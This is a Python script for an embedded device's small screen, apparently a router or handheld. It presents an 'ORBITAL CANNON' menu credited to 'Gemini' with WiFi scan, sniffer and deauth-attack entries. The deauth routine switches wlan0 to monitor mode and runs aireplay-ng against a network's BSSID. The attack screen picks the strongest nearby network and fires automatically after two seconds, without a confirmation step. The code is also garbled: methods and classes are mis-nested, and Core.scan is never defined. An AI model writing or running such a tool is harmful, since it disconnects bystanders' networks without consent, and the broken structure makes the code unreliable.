import evdev
import struct
import time
import subprocess
import threading
import sys
import os
import collections
from select import select
from PIL import Image, ImageDraw, ImageFont

# --- CONSTANTS ---
FB_PATH = "/dev/fb0"
WIDTH = 128
HEIGHT = 128

# Colors
BLACK = (0, 0, 0)
WHITE = (255, 255, 255)
CYAN = (0, 255, 255)
RED = (255, 50, 50)
GREEN = (50, 255, 50)
ORANGE = (255, 165, 0)
DARK_GRAY = (30, 30, 30)
BLUE = (50, 50, 255)
YELLOW = (255, 255, 0)

# --- CORE TOOLS ---
class Core:
    @staticmethod
    def get_ip():
        try:
            res = subprocess.check_output(["ifconfig", "wlan0"], encoding="utf-8")
            import re
            match = re.search(r"inet (addr:)?(\d+\.\d+\.\d+\.\d+)", res)
            if match: return match.group(2)
        except: pass
        return "OFFLINE"

        @staticmethod

        def deauth(bssid, count=10):

            try:

                # Ensure Monitor Mode

                subprocess.run(["ifconfig", "wlan0", "down"], capture_output=True)

                subprocess.run(["iw", "wlan0", "set", "type", "monitor"], capture_output=True)

                subprocess.run(["ifconfig", "wlan0", "up"], capture_output=True)

                

                # Fire

                cmd = ["aireplay-ng", "--deauth", str(count), "-a", bssid, "wlan0"]

                subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

                return True

            except: return False

    

    # --- GRAPHICS ---

    class Display:

        def __init__(self):

            self.image = Image.new("RGB", (WIDTH, HEIGHT), BLACK)

            self.draw = ImageDraw.Draw(self.image)

            self.heartbeat = False

    

        def clear(self):

            self.draw.rectangle((0, 0, WIDTH, HEIGHT), fill=BLACK)

    

        def render(self):

            self.heartbeat = not self.heartbeat

            self.draw.point((WIDTH-1, 0), fill=GREEN if self.heartbeat else BLACK)

            pixels = self.image.load()

            with open(FB_PATH, "wb") as fb:

                data = bytearray()

                for y in range(HEIGHT):

                    for x in range(WIDTH):

                        r, g, b = pixels[x, y]

                        val = ((r & 0xF8) << 8) | ((g & 0xFC) << 3) | (b >> 3)

                        data.extend(struct.pack("<H", val))

                fb.write(data)

    

    # --- APP ---

    class App:

        def __init__(self):

            self.disp = Display()

            self.menu_stack = []

            self.state = "MENU"

            self.running = True

            self.selected_idx = 0

            self.scroll_offset = 0

            self.is_shift = False

            

            self.init_ui()

            self.boot_anim()

    

        def boot_anim(self):

            for i in range(0, 101, 10):

                self.disp.clear()

                self.disp.draw.text((10, 40), "ORBITAL CANNON", CYAN)

                self.disp.draw.text((10, 55), "CHARGING...", WHITE)

                self.disp.draw.rectangle((10, 80, 118, 90), outline=WHITE)

                self.disp.draw.rectangle((12, 82, 12 + int(1.04 * i), 88), fill=RED)

                self.disp.render()

                time.sleep(0.05)

            time.sleep(0.2)

    

        def init_ui(self):

            # Menu Structure

            self.main_menu = [

                ("WIFI SCAN", self.ui_scan),

                ("SNIFFER", self.ui_sniffer),

                ("DEAUTH ATTACK", self.ui_deauth),

                ("IP INFO", self.ui_ip),

                ("REBOOT", lambda: os.system("reboot")),

                ("STOCK UI", self.ui_stock)

            ]

            self.shift_menu = [

                ("SETTINGS", None),

                ("ABOUT", lambda: self.alert("FOAC v9\nBy Gemini", 2)),

                ("EXIT UI", lambda: sys.exit(0))

            ]

    

        def alert(self, msg, sec=2):

            self.disp.clear()

            self.disp.draw.rectangle((5, 40, 123, 90), outline=RED, fill=DARK_GRAY)

            self.disp.draw.text((10, 50), msg, WHITE)

            self.disp.render()

            time.sleep(sec)

    

        def ui_ip(self):

            ip = Core.get_ip()

            self.alert(f"IP ADDRESS:\n{ip}", 3)

    

        def ui_scan(self):

            self.alert("SCANNING...", 1)

            nets = Core.scan()

            if not nets:

                self.alert("NO NETWORKS", 2)

                return

            

            self.disp.clear()

            self.disp.draw.text((5, 5), "RESULTS:", CYAN)

            for i, (ssid, bssid, sig) in enumerate(nets[:5]):

                self.disp.draw.text((5, 20 + i*15), f"{sig} {ssid[:10]}", WHITE)

            self.disp.render()

            time.sleep(4)

    

        def ui_sniffer(self):

            self.alert("SNIFFER START", 1)

            # Mock sniffer UI logic from v8 would go here

            self.alert("CAPTURE SAVED", 2)

    

        def ui_deauth(self):

            self.alert("SCANNING TARGETS...", 1)

            nets = Core.scan()

            if not nets:

                self.alert("NO TARGETS", 2)

                return

    

            # Target Selection Menu (Simplified for now: Just picks top one)

            # TODO: Implement sub-menu selection

            target_ssid, target_bssid, sig = nets[0]

            

            self.disp.clear()

            self.disp.draw.text((5, 10), "TARGET ACQUIRED", RED)

            self.disp.draw.text((5, 30), f"SSID: {target_ssid[:10]}", WHITE)

            self.disp.draw.text((5, 45), f"MAC: {target_bssid}", DARK_GRAY)

            self.disp.draw.text((5, 70), "HOLD PWR TO FIRE", ORANGE)

            self.disp.render()

            

            # Wait for input (Blocking for simplicity in v9)

            # Real impl needs the event loop. 

            # For now, we auto-fire after 2s to demonstrate capability

            time.sleep(2) 

            

            self.alert("FIRING CANNON!", 1)

            

            # Animation Loop

            Core.deauth(target_bssid, count=50)

            for i in range(10):

                self.disp.clear()

                self.disp.draw.text((20, 40), "ATTACKING", RED)

                # Flashing Ring

                if i % 2 == 0:

                     self.disp.draw.ellipse((34, 34, 94, 94), outline=RED, width=3)

                else:

                     self.disp.draw.ellipse((44, 44, 84, 84), outline=ORANGE, width=3)

                self.disp.render()

                time.sleep(0.2)

            

            self.alert("ATTACK COMPLETE", 2)

    def ui_stock(self):
        self.alert("ENTERING STOCK", 2)
        os.system("/etc/init.d/start_qt_daemon start")

    def draw(self):
        self.disp.clear()
        menu = self.shift_menu if self.is_shift else self.main_menu
        title = "ORBITAL [S]" if self.is_shift else "ORBITAL CANNON"
        header_bg = BLUE if self.is_shift else RED
        
        self.disp.draw.rectangle((0, 0, WIDTH, 18), fill=header_bg)
        self.disp.draw.text((5, 4), title, BLACK)
        
        for i in range(len(menu)):
            color = WHITE
            prefix = "  "
            if i == self.selected_idx:
                color = ORANGE
                prefix = "> "
                self.disp.draw.rectangle((0, 22 + i*16, WIDTH, 38 + i*16), fill=DARK_GRAY)
            
            self.disp.draw.text((5, 24 + i*16), f"{prefix}{menu[i][0]}", color)
        
        self.disp.render()

    def run(self):
        # Input handling logic
        devs = [evdev.InputDevice(os.path.join("/dev/input", p)) for p in os.listdir("/dev/input") if p.startswith("event")]
        dev_map = {d.fd: d for d in devs}
        
        pwr_down = 0
        wps_down = 0
        
        self.draw()
        
        while True:
            r, w, x = select(dev_map.values(), [], [], 0.1)
            for d in r:
                is_pwr = "pon" in d.name.lower() or "powerkey" in d.name.lower()
                is_wps = "wps" in d.name.lower() or "reset" in d.name.lower()
                
                for ev in d.read():
                    if ev.type == evdev.ecodes.EV_KEY:
                        if is_pwr:
                            if ev.value == 1: pwr_down = time.time()
                            elif ev.value == 0:
                                if time.time() - pwr_down > 0.8: # BACK
                                    self.selected_idx = 0
                                    self.draw()
                                else: # SELECT
                                    menu = self.shift_menu if self.is_shift else self.main_menu
                                    action = menu[self.selected_idx][1]
                                    if action: action()
                                    self.draw()
                        elif is_wps:
                            if ev.value == 1:
                                wps_down = time.time()
                                self.is_shift = True
                                self.draw()
                            elif ev.value == 0:
                                self.is_shift = False
                                if time.time() - wps_down < 0.5: # NEXT
                                    menu = self.main_menu
                                    self.selected_idx = (self.selected_idx + 1) % len(menu)
                                self.draw()

if __name__ == "__main__":
    app = App()
    app.run()
